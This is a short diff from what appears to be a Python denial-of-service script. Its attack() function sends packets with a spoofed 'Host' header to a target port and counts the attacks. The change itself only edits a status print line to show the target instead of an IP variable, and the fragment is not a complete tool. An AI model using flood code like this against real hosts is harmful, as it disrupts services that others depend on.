@@ -111,6 +111,6 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         global attack_num
         attack_num += 1
-        print (f"{green}Sent{red} {send}{green} attack_num {blue} {ip}{green} port {yellow}{port}{default}")
+        print (f"{green}Sent{red} {send}{green} attack_num {blue} {target}{green} port {yellow}{port}{default}")
         s.close()
 #print('Atacando porta 💥')
